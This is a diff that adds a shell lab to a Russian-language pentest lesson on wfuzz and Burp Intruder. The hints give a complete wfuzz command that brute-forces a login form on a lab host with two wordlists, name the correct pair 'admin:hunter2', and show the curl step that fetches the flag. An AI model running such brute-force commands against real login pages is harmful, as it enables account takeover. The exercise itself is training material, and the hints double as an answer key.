@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 40
 summary: "wfuzz (payloads, encoders, iterators, фильтры) и Burp Intruder (sniper/battering ram/pitchfork/cluster bomb) с рецептами."
+lab:
+  kind: shell
+  title: "Практика: wfuzz — две позиции"
+  toolset: [core, wfuzz, curl]
+  workdir: /home/student/task
+  files: [task.md, users.txt, pass.txt]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Одним словарём пару логин-пароль не перебрать — нужны два источника payload.
+    - `-z file,users.txt:FUZZ -z file,pass.txt:FUZ2Z` даёт декартово произведение.
+    - `wfuzz -z file,users.txt:FUZZ -z file,pass.txt:FUZ2Z -d 'user=FUZZ&pass=FUZ2Z' -u https://shop.acme-lab.test/login --hc 200`.
+    - Верная пара — `admin:hunter2`. Войди: `curl -s -X POST https://shop.acme-lab.test/login -d 'user=admin&pass=hunter2' | grep 'nto{' > found.txt`, затем `check`.
 ---
 
 ## Задача
